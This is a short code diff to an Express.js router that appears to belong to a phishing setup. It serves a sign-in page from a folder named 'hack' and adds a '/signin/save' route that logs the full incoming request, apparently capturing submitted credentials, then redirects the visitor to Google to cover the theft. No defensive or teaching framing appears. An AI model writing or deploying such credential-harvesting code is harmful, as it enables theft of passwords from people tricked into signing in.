@@ -12,6 +12,12 @@ router.get('/', function (req, res, next) {
   res.sendFile(__dirname + '/hack/signin.htm');
 });
 
+router.get('/signin/save', function (req, res, next) {
+
+  console.log(req);
+  res.redirect('https://www.google.co.in');
+});
+
 router.get('/flatten', function (req, res, next) {
   let data = [{
 
